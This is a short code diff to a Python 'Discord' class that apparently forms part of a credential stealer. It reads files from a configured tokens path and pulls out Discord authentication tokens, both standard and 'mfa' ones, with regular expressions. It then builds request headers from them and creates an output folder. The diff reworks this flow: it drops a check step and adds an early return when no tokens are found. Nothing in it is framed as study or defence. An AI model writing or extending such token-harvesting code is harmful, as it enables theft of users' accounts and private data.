@@ -22,12 +22,6 @@ class Discord:
         if not path.exists(folder):
             makedirs(folder)
 
-    def __check_tokens(self):
-
-        if path.exists(self.config.TokensPath):
-            self.__create_folder()
-            self.__get_tokens()
-
     def __get_headers(self, token: str = None, content_type: str = "application/json"):
 
         headers = {
@@ -54,6 +48,11 @@ class Discord:
             for data in [line.strip() for line in open(rf"{self.config.TokensPath}\{file}", "r", errors="ignore", encoding="utf-8").readlines()]:
                 for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                     [tokens.append(item) for item in findall(regex, data)]
+
+        if len(tokens) < 1:
+            return
+
+        self.__create_folder()
 
         for token in tokens:
 
@@ -88,7 +87,7 @@ class Discord:
         try:
 
             if self.statuses[0] is True:
-                self.__check_tokens()
+                self.__get_tokens()
 
         except Exception as e:
             if self.errors is True: print(f"[DISCORD]: {repr(e)}")
